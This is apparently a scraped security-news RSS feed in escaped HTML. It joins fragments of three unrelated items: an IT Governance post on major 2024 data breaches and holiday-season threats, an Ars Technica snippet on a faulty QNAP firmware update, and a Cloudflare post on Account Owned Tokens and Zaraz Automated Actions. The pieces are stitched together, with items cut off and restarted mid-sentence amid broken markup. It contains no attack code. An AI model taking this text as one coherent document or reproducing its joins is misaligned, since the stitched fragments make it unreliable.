          &lt;figure&gt;

          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;TLDs originating the largest total shares of malicious and spam email in 2024&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;

National Public data breach In August 2024, NPD (National Public Data) confirmed a breach that compromised sensitive information, including Social Security numbers, affecting nearly all Americans. The breach was linked to unauthorised access attempts in December 2023 and potential data leaks in April and summer 2024. Personal data of up &lt;/p&gt;
&lt;p&gt;The post &lt;a href="https://www.itgovernance.co.uk/blog/cyber-threats-during-the-holidays-how-to-stay-safe-from-seasonal-scams-and-data-breaches"&gt;Cyber Threats During the Holidays: How to Stay Safe From Seasonal Scams and Data Breaches&lt;/a&gt; appeared first on &lt;a href="https://www.itgovernance.co.uk/blog"&gt;IT Governance Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;As the year draws to a close, let’s look at:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;What were some of the biggest breaches in 2024?&lt;/li&gt;



&lt;li&gt;What threats should you be aware of this Christmas?&lt;/li&gt;



&lt;li&gt;How can organisations stay safe during the festive season?&lt;/li&gt;
&lt;/ul&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;3 major data breaches from 2024&lt;/h2&gt;



&lt;p&gt;COMBs (compilations of many breaches) aside – like the &lt;a href="https://www.itgovernance.co.uk/blog/mother-of-all-breaches-26-billion-records-leaked" rel="noreferrer noopener" target="_blank"&gt;MOAB (mother of all breaches)&lt;/a&gt; in January 2024, which leaked more than 26 &lt;em&gt;billion &lt;/em&gt;records – let’s look at three major breaches from 2024:&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;1. National Public data breach&lt;/h3&gt;



&lt;p&gt;In August 2024, NPD (National Public Data) &lt;a href="https://nypost.com/2024/08/19/business/national-public-data-admits-hackers-stole-social-security-numbers/" rel="noreferrer noopener" target="_blank"&gt;confirmed&lt;/a&gt; a breach that compromised sensitive information, including Social Security numbers, affecting nearly all Americans.&lt;/p&gt;



&lt;p&gt;The breach was linked to unauthorised access attempts in December 2023 and potential data leaks in April and summer 2024.&lt;/p&gt;



&lt;p&gt;Personal data of up to 2.9 billion individuals was reportedly posted on the dark web for $3.5 million (about £2.8 million).&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;2. Ticketmaster data breach&lt;/h3&gt;



&lt;p&gt;In May 2024, Ticketmaster, a subsidiary of Live Nation, &lt;a href="https://time.com/6984811/ticketmaster-data-breach-customers-livenation-everything-to-know/" rel="noreferrer noopener" target="_blank"&gt;experienced&lt;/a&gt; a significant data breach, apparently affecting 560 million users.&lt;/p&gt;



&lt;p&gt;The threat actor ShinyHunters claimed responsibility, offering 1.3 TB of customer data, including &lt;a href="https://www.itgovernance.co.uk/blog/the-gdpr-do-you-know-the-difference-between-personal-data-and-sensitive-data" rel="noreferrer noopener" target="_blank"&gt;personal data&lt;/a&gt; and credit card details, for sale on the dark web.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;3. Internet Archive data breach&lt;/h3&gt;



&lt;p&gt;In October 2024, the Internet Archive, including its Wayback Machine, &lt;a href="https://www.thesun.ie/news/13986599/internet-archive-data-breach-wayback-machine-hacking-impact-users/" rel="noreferrer noopener" target="_blank"&gt;suffered&lt;/a&gt; a cyber attack that exposed data of potentially 31 million users.&lt;/p&gt;



&lt;p&gt;The breach involved a malicious JavaScript pop-up that directed users to check compromised email addresses and passwords.&lt;/p&gt;



&lt;p&gt;Exposed data included email addresses, usernames and bcrypt password hashes.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;3 threats organisations face during the holiday season&lt;/h2&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;1. Ransomware attacks&lt;/h3&gt;



&lt;p&gt;During the holiday period, cyber criminals know that many organisations have fewer staff available, and potentially more lax security. This can lead to increased ransomware incidents, as illustrated by &lt;a href="https://therecord.media/cyberattack-on-massachusetts-hospital-disrupted-health-record-system" rel="noreferrer noopener" target="_blank"&gt;last year’s holiday season&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;&lt;a href="https://www.itgovernance.co.uk/blog/worrying-ransomware-trends-and-what-to-do-about-them" rel="noreferrer noopener" target="_blank"&gt;Today’s ransomware&lt;/a&gt; doesn’t just &lt;em&gt;encrypt&lt;/em&gt; data – it often &lt;em&gt;exfiltrates&lt;/em&gt; data, too.&lt;/p&gt;



&lt;p&gt;Threat actors exploit a range of vulnerabilities for this, including:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Weak passwords;&lt;/li&gt;



&lt;li&gt;Unpatched systems;&lt;/li&gt;



&lt;li&gt;Zero-day vulnerabilities; and&lt;/li&gt;



&lt;li&gt;Insecure remote access solutions.&lt;/li&gt;
&lt;/ul&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;2. DoS (denial-of-service) attacks&lt;/h3&gt;



&lt;p&gt;Retailers and e-commerce platforms are particularly vulnerable to DoS attacks during peak shopping times, aiming to disrupt services and cause financial losses.&lt;/p&gt;



&lt;p&gt;A DoS attack involves a cyber attacker flooding your servers with requests such that they can’t cope. That can result in your website, emails and other services going down, depending on the server targeted.&lt;/p&gt;



&lt;p&gt;Platforms may also be targeted by a DDoS (distributed denial-of-service) attack. This is a variant of a DoS attack, with the key difference that DDoS attacks involve multiple machines attacking the target.&lt;/p&gt;



&lt;p&gt;(With a DoS attack, just one computer is attacking the server.)&lt;/p&gt;



&lt;p&gt;Attackers may also launch a DoS attack to distract you from a different attack – ransomware, for example.&lt;/p&gt;



&lt;div class="wp-clock-spacer" style="height: 25px;"&gt;&lt;/div&gt;



&lt;h3 class="wp-block-heading"&gt;3. Phishing and social engineering&lt;/h3&gt;



&lt;p&gt;Phishing and social engineering attacks invariably rise during the holidays, targeting both consumers and employees.&lt;/p&gt;



&lt;p&gt;Common holiday scams include:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Fake delivery notifications;&lt;/li&gt;



&lt;li&gt;Fake charities requesting donations;&lt;/li&gt;



&lt;li&gt;Fraudulent vacation offers and rentals;&lt;/li&gt;



&lt;li&gt;Social media scams – impersonated brands and fake giveaways; and&lt;/li&gt;



&lt;li&gt;Fake shopping sites with urgent deals and too-good-to-be-true offers.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;With more staff out of office, threat actors may also impersonate an employee, asking a ‘colleague’ to take action on their behalf.&lt;/p&gt;



&lt;p&gt;Such emails often contain a sense of urgency, or try to manipulate you in another way. Don’t forget: social engineering is all about exploiting your psychology.&lt;/p&gt;



&lt;p&gt;As our penetration tester Hilmi Tin explained in &lt;a href="https://www.itgovernance.co.uk/blog/meet-the-hacker-how-simulated-phishing-addresses-your-biggest-security-risk#What-is-simulated-phishing" rel="noreferrer noopener" target="_blank"&gt;this interview&lt;/a&gt;, attackers take advantage of the fact we’re curious, or make clever use of fear tactics.&lt;/p&gt;



&lt;p&gt;He also recommends simply taking ten seconds to look out for warning signs – particularly if the message is unexpected and making you feel like you need to do something.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;How to protect your sensitive data&lt;/h2&gt;



&lt;p&gt;To protect your sensitive data – including personal data – make sure you’re clear on:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;What data you hold;&lt;/li&gt;



&lt;li&gt;Where it’s stored; and&lt;/li&gt;



&lt;li&gt;Who can access that data.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Tools like data inventories, &lt;a href="https://www.itgovernance.co.uk/blog/streamlining-gdpr-compliance-with-ropas-data-flow-maps-and-dpias#Data-flow-mapping" rel="noreferrer noopener" target="_blank"&gt;data flow maps&lt;/a&gt; and &lt;a href="https://www.itgovernance.co.uk/blog/records-of-processing-activities-ropas-simplifying-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;ROPAs (records of processing activities)&lt;/a&gt; will help with this. Ideally, these also highlight the technical and/or organisational measures in place to process and secure that data, as required by the &lt;a href="https://www.itgovernance.co.uk/data-protection-dpa-and-eu-data-protection-regulation" rel="noreferrer noopener" target="_blank"&gt;GDPR (General Data Protection Regulation)&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;Other tools like &lt;a href="https://www.itgovernance.co.uk/blog/streamlining-gdpr-compliance-with-ropas-data-flow-maps-and-dpias#Data-protection-impact-assessment" rel="noreferrer noopener" target="_blank"&gt;DPIAs (data protection impact assessments)&lt;/a&gt; also provide valuable information, making it easier to understand your data, so you can better &lt;a href="https://www.itgovernance.co.uk/blog/how-do-you-mitigate-information-security-risk" rel="noreferrer noopener" target="_blank"&gt;manage your risks&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;Up-to-date policies and procedures will also improve your cyber security and privacy stance, and ensure you’re ready to deal with any threats.&lt;/p&gt;



&lt;p&gt;Finally, &lt;a href="https://www.itgovernance.co.uk/staff-awareness-e-learning-courses" rel="noreferrer noopener" target="_blank"&gt;staff awareness training&lt;/a&gt; offers another valuable boost to your security.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading"&gt;Going the extra mile&lt;/h2&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="alignright size-large is-resized"&gt;&lt;a href="https://www.itgovernance.co.uk/shop/product/meet-the-hacker-simulated-phishing-programme" rel=" noreferrer noopener" target="_blank"&gt;&lt;img alt="" src="https://www.itgovernance.co.uk/shop/images/product/medium/6116.png" style="width: 200px;" /&gt;&lt;/a&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;But to find out whether your training and other measures are effective, consider launching a (simulated) real-world attack.&lt;/p&gt;



&lt;p&gt;Our unique &lt;a href="https://www.itgovernance.co.uk/shop/product/meet-the-hacker-simulated-phishing-programme" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;simulated phishing programme&lt;/strong&gt;&lt;/a&gt; combines interactive staff training, simulated phishing attacks and a session with an ethical hacker to significantly improve your resilience to phishing attacks.&lt;/p&gt;



&lt;p&gt;Following testing, employees will receive personalised feedback on their vulnerabilities, practical advice on phishing detection and a clear understanding of how to protect your organisation better.&lt;/p&gt;



&lt;p&gt;We’ve trialled this programme with various organisations, and the results have been incredible. The live training sessions dramatically reduce the risk of phishing attacks, and end users find the interaction and ability to ask questions invaluable.&lt;/p&gt;

The company has pulled back the firmware and issued a fixed version, but the company's response has left some users feeling less confident in the boxes into which they put all their digital stuff.&lt;/p&gt;
&lt;p&gt;As seen on &lt;a href="https://community.qnap.com/t/firmware-qts-5-2-2-2950-build-20241114-released/254"&gt;a QNAP community thread&lt;/a&gt;, and as &lt;a href="https://www.qnap.com/en-us/news/2024/qnap-addresses-recent-qts-5-2-2-operating-system-update-issues"&gt;announced by QNAP itself&lt;/a&gt;, the QNAP operating system, QTS, received update 5.2.2.2950, build 20241114, at some point around November 19. After QNAP "received feedbacks from some users reporting issues with device functionality after installation," the firm says it withdrew it, "conducted a comprehensive investigation," and re-released a fixed version "within 24 hours."&lt;/p&gt;
&lt;p&gt;The community thread sees many more users of different systems having problems than the shortlist ("limited models of TS-x53D series and TS-x51 series") released by QNAP. Issues reported included owners being rejected as an authorized user, devices reporting issues with booting, and claims of Python not being installed to run some apps and services.&lt;/p&gt;&lt;p&gt;&lt;a href="https://arstechnica.com/gadgets/2024/11/qnap-firmware-update-leaves-nas-owners-locked-out-of-their-boxes/"&gt;Read full article&lt;/a&gt;&lt;/p&gt;

Additionally, Zaraz Automation Actions streamlines event tracking and third-party tool integration.</description><content:encoded>&lt;p&gt;In October 2024, we started publishing roundup blog posts to share the latest features and updates from our teams. Today, we are announcing general availability for Account Owned Tokens, which allow organizations to improve access control for their Cloudflare services. Additionally, we are launching Zaraz Automated Actions, which is a new feature designed to streamline event tracking and tool integration when setting up third-party tools. By automating common actions like pageviews, custom events, and e-commerce tracking, it removes the need for manual configurations.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Improving access control for Cloudflare services with Account Owned Tokens&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#improving-access-control-for-cloudflare-services-with-account-owned-tokens"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Cloudflare is critical infrastructure for the Internet, and we understand that many of the organizations that build on Cloudflare rely on apps and integrations outside the platform to make their lives easier. In order to allow access to Cloudflare resources, these apps and integrations interact with Cloudflare via our API, enabled by access tokens and API keys. Today, the API Access Tokens and API keys on the Cloudflare platform are owned by individual users, which can lead to some difficulty representing services, and adds an additional dependency on managing users alongside token permissions.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;What’s new about Account Owned Tokens&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#whats-new-about-account-owned-tokens"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;First, a little explanation because the terms can be a little confusing. On Cloudflare, we have both Users and Accounts, and they mean different things, but sometimes look similar. Users are people, and they sign in with an email address. Accounts are not people, they’re the top-level bucket we use to organize all the resources you use on Cloudflare. Accounts can have many users, and that’s how we enable collaboration. If you use Cloudflare for your personal projects, both your User and Account might have your email address as the name, but if you use Cloudflare as a company, the difference is more apparent because your user is “&lt;a&gt;&lt;u&gt;joe.smith@example.com&lt;/u&gt;&lt;/a&gt;” and the account might be “Example Company”. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5tcNkxDjYz9jAXnfV0bPON/920a9dade7145de2adee21afa43d786e/image13.jpg" /&gt;
          &lt;/figure&gt;&lt;p&gt;Account Owned Tokens are not confined by the permissions of the creating user (e.g. a user can never make a token that can edit a field that they otherwise couldn’t edit themselves) and are scoped to the account they are owned by. This means that instead of creating a token belonging to the user “&lt;a&gt;&lt;u&gt;joe.smith@example.com&lt;/u&gt;&lt;/a&gt;”, you can now create a token belonging to the account “Example Company”.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/ibh4sT2wgVLVTgqgv2rtO/eb972a5b1c5fa0f70471631430a8ff91/image8.jpg" /&gt;
          &lt;/figure&gt;&lt;p&gt;The ability to make these tokens, owned by the account instead of the user, allows for more flexibility to represent what the access should be used for.&lt;/p&gt;&lt;p&gt;Prior to Account Owned Tokens, customers would have to have a user (&lt;a&gt;&lt;u&gt;joe.smith@example.com&lt;/u&gt;&lt;/a&gt;) create a token to pull a list of Cloudflare zones for their account and ensure their security settings are set correctly as part of a compliance workflow, for example. All of the actions this compliance workflow does are now attributed to joe.smith, and if joe.smith leaves the company and his permissions are revoked, the compliance workflow fails.&lt;/p&gt;&lt;p&gt;With this new release, an Account Owned Token could be created, named “compliance workflow”, with permissions to do this operation independently of &lt;a&gt;&lt;u&gt;joe.smith@example.com&lt;/u&gt;&lt;/a&gt;. All actions this token does are attributable to “compliance workflow”. This token is visible and manageable by all the superadmins on your Cloudflare account. If joe.smith leaves the company, the access remains independent of that user, and all super administrators on the account moving forward can still see, edit, roll, and delete the token as needed.&lt;/p&gt;&lt;p&gt;Any long-running services or programs can be represented by these types of tokens, be made visible (and manageable) by all super administrators in your Cloudflare account, and truly represent the service, instead of the users managing the service. Audit logs moving forward will log that a given token was used, and user access can be kept to a minimum.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Getting started&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#getting-started"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Account Owned Tokens can be found on the new “API Tokens” tab under the “Manage Account” section of your Cloudflare dashboard, and any Super Administrators on your account have the capability to create, edit, roll, and delete these tokens. The API is the same, but at a new &lt;code&gt;/account/&amp;lt;accountId&amp;gt;/tokens&lt;/code&gt; endpoint.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/uZFVUp1RRP1NgZli9RAYN/5e2b90bea51b7b45bb25478120fd9024/Screenshot_2024-11-13_at_20.14.43.png" /&gt;
          &lt;/figure&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1kiUi4lsJESJqr9HhgCS92/b4b0a3e955742346a5c945601fff4885/image3.png" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;Why/where should I use Account Owned Tokens?&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#why-where-should-i-use-account-owned-tokens"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;There are a few places we would recommend replacing your User Owned Tokens with Account Owned Tokens:&lt;/p&gt;&lt;p&gt;1. &lt;b&gt;Long-running services that are managed by multiple people:&lt;/b&gt; When multiple users all need to manage the same service, Account Owned Tokens can remove the bottleneck of requiring a single person to be responsible for all the edits, rotations, and deletions of the tokens. In addition, this guards against any user lifecycle events affecting the service. If the employee that owns the token for your service leaves the company, the service’s token will no longer be based on their permissions.&lt;/p&gt;&lt;p&gt;2.&lt;b&gt; Cloudflare accounts running any services that need attestable access records beyond user membership:&lt;/b&gt; By restricting all of your users from being able to access the API, and consolidating all usable tokens to a single list at the account level, you can ensure that a complete list of all API access can be found in a single place on the dashboard, under “Account API Tokens”.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2qtssh6bef5Ne6kugqUUnc/af11e3db733f4f38188988ac42034c26/image9.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;3. &lt;b&gt;Anywhere you’ve created “Service Users”:&lt;/b&gt; “Service Users”, or any identity that is meant to allow multiple people to access Cloudflare, are an active threat surface. They are generally highly privileged, and require additional controls (vaulting, password rotation, monitoring) to ensure non-repudiation and appropriate use. If these operations solely require API access, consolidating that access into an Account Owned Token is safe.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Why/where should I use User Owned Tokens?&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#why-where-should-i-use-user-owned-tokens"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;There are a few scenarios/situations where you should continue to use User Owned Tokens:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Where programmatic access is done by a single person at an external interface:&lt;/b&gt; If a single user has an external interface using their own access privileges at Cloudflare, it still makes sense to use a personal token, so that information access can be traced back to them. (e.g. using a personal token in a data visualization tool that pulls logs from Cloudflare)&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://developers.cloudflare.com/api/operations/user-user-details"&gt;&lt;b&gt;&lt;u&gt;User level operations&lt;/u&gt;&lt;/b&gt;&lt;/a&gt;&lt;b&gt;:&lt;/b&gt; Any operations that operate on your own user (e.g. email changes, password changes, user preferences) still require a user level token.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Where you want to control resources over multiple accounts with the same credential:&lt;/b&gt; As of November 2024, Account Owned Tokens are scoped to a single account. In 2025, we want to ensure that we can create cross-account credentials, anywhere that multiple accounts have to be called in the same set of operations should still rely on API Tokens owned by a user.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Where we currently do not support a given endpoint:&lt;/b&gt; We are currently in the process of working through a &lt;a href="https://developers.cloudflare.com/fundamentals/api/get-started/account-owned-tokens/"&gt;&lt;u&gt;list of our services&lt;/u&gt;&lt;/a&gt; to ensure that they all support Account Owned Tokens. When interacting with any of these services that are not supported programmatically, please continue to use User Owned Tokens.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Where you need to do token management programmatically:&lt;/b&gt; If you are in an organization that needs to create and delete large numbers of tokens programmatically, please continue to use User Owned Tokens. In late 2024, watch for the “Create Additional Tokens” template on the Account Owned Tokens Page. This template and associated created token will allow for the management of additional tokens.&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/4BGL99WFnh4oOgTFhRY5N3/26bca9fa8851729d4128c2836db62c3c/image6.png" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;What does this mean for my existing tokens and programmatic access moving forward?&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#what-does-this-mean-for-my-existing-tokens-and-programmatic-access-moving-forward"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;We do not plan to decommission User Owned Tokens, as they still have a place in our overall access model and are handy for ensuring user-centric workflows can be implemented.&lt;/p&gt;&lt;p&gt;As of November 2024, we’re still working to ensure that ALL of our endpoints work with Account Owned Tokens, and we expect to deliver additional token management improvements continuously, with an expected end date of Q3 2025 to cover all endpoints.&lt;/p&gt;&lt;p&gt;A list of services that support, and do not support, Account Owned Tokens can be found in our &lt;a href="https://developers.cloudflare.com/fundamentals/api/get-started/account-owned-tokens/"&gt;&lt;u&gt;documentation.&lt;/u&gt;&lt;/a&gt;&lt;/p&gt;
          &lt;div&gt;

            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;If Account Owned Tokens could provide value to your or your organization, documentation is available &lt;a href="https://developers.cloudflare.com/fundamentals/api/get-started/account-owned-tokens/"&gt;&lt;u&gt;here&lt;/u&gt;&lt;/a&gt;, and you can give them a try today from the “API Tokens” menu in your dashboard.&lt;/p&gt;

            &lt;a href="https://blog.cloudflare.com/tag/security/rss#zaraz-automated-actions-makes-adding-tools-to-your-website-a-breeze"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/5DkxlchIDUZbQ15x0H0usK/eb656617c1c83805bda98c7dfe896bda/image2.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;a href="https://www.cloudflare.com/en-gb/application-services/products/zaraz/"&gt;&lt;u&gt;Cloudflare Zaraz&lt;/u&gt;&lt;/a&gt; is a tool designed to manage and optimize third-party tools like analytics, marketing tags, or social media scripts on websites. By loading these third-party services through Cloudflare’s network, Zaraz improves website performance, security, and privacy. It ensures that these external scripts don't slow down page loading times or expose sensitive user data, as it handles them efficiently through Cloudflare's global network, reducing latency and improving the user experience.&lt;/p&gt;&lt;p&gt;Automated Actions are a new product feature that allow users to easily setup page views, custom events, and e-commerce tracking without going through the tedious process of manually setting up triggers and actions.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Why we built Automated Actions&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#why-we-built-automated-actions"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;An action in Zaraz is a way to tell a third party tool that a user interaction or event has occurred when certain conditions, defined by &lt;a href="https://developers.cloudflare.com/zaraz/custom-actions/create-trigger/"&gt;&lt;u&gt;triggers&lt;/u&gt;&lt;/a&gt;, are met. You create actions from within the tools page, associating them with specific tools and triggers.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/6a0xBA0uG55z4mhVkN0aYl/10101523491c68e4f2eec022737d15d4/image12.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;Setting up a tool in Zaraz has always involved a few steps: &lt;a href="https://developers.cloudflare.com/zaraz/custom-actions/create-trigger/"&gt;&lt;u&gt;configuring a trigger&lt;/u&gt;&lt;/a&gt;, &lt;a href="https://developers.cloudflare.com/zaraz/custom-actions/create-action/"&gt;&lt;u&gt;linking it to a tool action&lt;/u&gt;&lt;/a&gt; and finally calling &lt;a href="https://developers.cloudflare.com/zaraz/web-api/track/"&gt;&lt;code&gt;&lt;u&gt;zaraz.track()&lt;/u&gt;&lt;/code&gt;&lt;/a&gt;. This process allowed advanced configurations with complex rules, and while it was powerful, it occasionally left users confused — why isn’t calling &lt;code&gt;zaraz.track()&lt;/code&gt; enough? We heard your feedback, and we’re excited to introduce &lt;b&gt;Zaraz Automated Actions&lt;/b&gt;, a feature designed to make Zaraz easier to use by reducing the amount of work needed to configure a tool.&lt;/p&gt;&lt;p&gt;With Zaraz Automated Actions, you can now automate sending data to your third-party tools without the need to create a manual configuration. Inspired by the simplicity of &lt;a href="https://developers.cloudflare.com/zaraz/web-api/ecommerce/"&gt;&lt;code&gt;&lt;u&gt;zaraz.ecommerce()&lt;/u&gt;&lt;/code&gt;&lt;/a&gt;, we’ve extended this ease to all Zaraz events, removing the need for manual trigger and action setup. For example, calling &lt;code&gt;zaraz.track(‘myEvent’)&lt;/code&gt; will send your event to the tool without the need to configure any triggers or actions.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Getting started with Automated Actions&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#getting-started-with-automated-actions"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;When adding a new tool in Zaraz, you’ll now see an additional step where you can choose one of three Automated Actions: &lt;b&gt;pageviews&lt;/b&gt;, &lt;b&gt;all other events&lt;/b&gt;, or &lt;b&gt;ecommerce&lt;/b&gt;. These options allow you to specify what kind of events you want to automate for that tool.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1LRtb8XpSukCAgmK7uIA5Y/ab11ae9b58f474d08893b496a0eea764/image7.png" /&gt;
          &lt;/figure&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Pageviews&lt;/b&gt;: Automatically sends data to the tool whenever someone visits a page on your site, without any manual configuration.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;All other events&lt;/b&gt;: Sends all custom events triggered using zaraz.track() to the selected tool, making it easy to automate tracking of user interactions.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Ecommerce&lt;/b&gt;: Automatically sends all e-commerce events triggered via zaraz.ecommerce() to the tool, streamlining your sales and transaction tracking.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;These Automated Actions are also available for all your existing tools, which can be toggled on or off from the tool detail page in your Zaraz dashboard. This flexibility allows you to fine-tune which actions are automated based on your needs.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/xy1tIfYTfOo7p2IUeCS5d/42b26d6cfc4c05d8adc67edfc38ac34c/image10.png" /&gt;
          &lt;/figure&gt;
          &lt;div&gt;
            &lt;h3&gt;Custom actions for tools without Automated Action support&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#custom-actions-for-tools-without-automated-action-support"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Some tools do not support automated actions because the tool itself does not support page view, custom, or e-commerce events. For such tools you can still create your own custom actions, just like before. Custom actions allow you to configure specific events to send data to your tools based on unique triggers. The process remains the same, and you can follow the detailed steps outlined in our&lt;a href="https://developers.cloudflare.com/zaraz/get-started/create-actions/"&gt; &lt;u&gt;Create Actions guide&lt;/u&gt;&lt;/a&gt;. Remember to set up your trigger first, or choose an existing one, before configuring the action.&lt;/p&gt;&lt;h4&gt;Automatically enrich your payload&lt;/h4&gt;&lt;p&gt;When creating a custom action, it is now easier to send Event Properties using the &lt;b&gt;Include Event Properties field.&lt;/b&gt; When this is toggled on, you can automatically send client-specific data with each action, such as user behavior or interaction details. For example, to send an &lt;code&gt;userID&lt;/code&gt; property when sending a &lt;code&gt;click&lt;/code&gt; event you can do something like this: &lt;code&gt;zaraz.track(‘click’, { userID: “foo” })&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Additionally, you can enable the &lt;b&gt;Include System Properties&lt;/b&gt; option to send system-level information, such as browser, operating system, and more. In your action settings click on “Add Field”, pick the “Include System Properties”, click on confirm and then toggle the field on. &lt;/p&gt;&lt;p&gt;For a full list of system properties, visit our&lt;a href="https://developers.cloudflare.com/zaraz/reference/context/"&gt; &lt;u&gt;System Properties reference guide&lt;/u&gt;&lt;/a&gt;. These options give you greater flexibility and control over the data you send with custom actions.&lt;/p&gt;&lt;p&gt;These two fields replace the now deprecated “Enrich Payload” dropdown field.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/73nCsNmeG58p6n0ylxMV8E/5cb87b516aaceb38319f9175dc7ccbf3/image5.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;Zaraz Automated Actions marks a significant step forward in simplifying how you manage events across your tools. By automating common actions like page views, e-commerce events, and custom tracking, you can save time and reduce the complexity of manual configurations. Whether you’re leveraging Automated Actions for speed or creating custom actions for more tailored use cases, Zaraz offers the flexibility to fit your workflow. &lt;/p&gt;&lt;p&gt;We’re excited to see how you use this feature.

